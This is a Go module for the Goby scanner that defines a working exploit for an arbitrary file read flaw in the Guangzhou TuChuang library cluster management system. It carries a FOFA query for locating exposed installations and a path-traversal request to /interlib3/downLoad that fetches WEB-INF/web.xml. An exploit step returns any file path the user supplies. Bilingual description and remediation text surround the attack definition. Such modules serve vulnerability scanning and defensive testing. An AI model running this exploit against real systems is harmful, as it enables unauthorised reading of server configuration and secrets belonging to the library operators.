package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Guangzhou TuChuang Library Cluster Management System /interlib3/downLoad File Read Vulnerability",
    "Description": "<p>Guangzhou Tuchuang Computer Software Development Co., Ltd. is a high-tech enterprise that integrates product research and development, application integration, and customer service. Its main goal is to provide high-quality application software system design, integration, and maintenance services for library industry users</p><p>Guangzhou TuChuang Library Cluster Management System is a management system developed by Guangzhou TuChuang Computer Software Development Co., Ltd. for the library industry. The /downLoad interface of this system has an arbitrary file read vulnerability. Attackers can exploit this vulnerability to read arbitrary files on the server by crafting specially designed requests, potentially leading to sensitive information disclosure and system configuration exposure.</p>",
    "Product": "Guangzhou TuChuang Library Cluster Management System",
    "Homepage": "http://www.gzlib.com/",
    "DisclosureDate": "2024-12-03",
    "PostTime": "2024-12-03",
    "Author": "1638690747@qq.com",
    "FofaQuery": " body=\"interlib\" || (body=\"广州图创\" && body=\"/interlib/common/\")",
    "GobyQuery": " body=\"interlib\" || (body=\"广州图创\" && body=\"/interlib/common/\")",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files on the server through unauthorized access, potentially leading to sensitive information disclosure and system configuration exposure, which may facilitate further attacks.</p>",
    "Recommendation": "<p>It is recommended to allow access only to pre-approved file paths and deny all other paths; carefully validate the file paths requested by users to ensure they point to files that are allowed to be accessed; and promptly apply security updates and patches to fix any discovered vulnerabilities.</p>",
    "References": [
        "https://blog.csdn.net/qq_44905116/article/details/140201081"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/interlib3/downLoad?file=../WEB-INF/web.xml",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/interlib3/downLoad?file=../WEB-INF/web.xml"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/interlib3/downLoad?file={{{filePath}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "广州图创图书馆集群管理系统 /interlib3/downLoad 文件读取漏洞",
            "Product": "广州图创图书馆集群管理系统",
            "Description": "<p>广州图创计算机软件开发有限公司是集产品研发、应用集成、客户服务为一体的高新技术企业，主要目标是为图书馆行业用户提供高质量的应用软件系统设计、集成和维护服务<br></p><p>广州图创图书馆集群管理系统是由广州图创计算机软件开发有限公司开发的一款应用于图书馆行业的管理系统。该系统的/downLoad接口存在任意文件读取漏洞，攻击者可以通过构造精心设计的请求，读取服务器上的任意文件，可能导致敏感信息泄露、系统配置暴露等安全风险。</p>",
            "Recommendation": "<p>建议仅允许访问预先批准的文件路径，并拒绝所有其他路径；仔细验证用户请求的文件路径，确保其指向允许访问的文件；及时应用安全更新和补丁，以修复任何已发现的漏洞。</p>",
            "Impact": "<p>该漏洞允许攻击者通过未授权访问读取服务器上的任意文件，可能导致敏感信息泄露、系统配置暴露，进而为进一步的攻击提供便利。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Guangzhou TuChuang Library Cluster Management System /interlib3/downLoad File Read Vulnerability",
            "Product": "Guangzhou TuChuang Library Cluster Management System",
            "Description": "<p>Guangzhou Tuchuang Computer Software Development Co., Ltd. is a high-tech enterprise that integrates product research and development, application integration, and customer service. Its main goal is to provide high-quality application software system design, integration, and maintenance services for library industry users<br></p><p>Guangzhou TuChuang Library Cluster Management System is a management system developed by Guangzhou TuChuang Computer Software Development Co., Ltd. for the library industry. The /downLoad interface of this system has an arbitrary file read vulnerability. Attackers can exploit this vulnerability to read arbitrary files on the server by crafting specially designed requests, potentially leading to sensitive information disclosure and system configuration exposure.</p>",
            "Recommendation": "<p>It is recommended to allow access only to pre-approved file paths and deny all other paths; carefully validate the file paths requested by users to ensure they point to files that are allowed to be accessed; and promptly apply security updates and patches to fix any discovered vulnerabilities.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files on the server through unauthorized access, potentially leading to sensitive information disclosure and system configuration exposure, which may facilitate further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9975"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}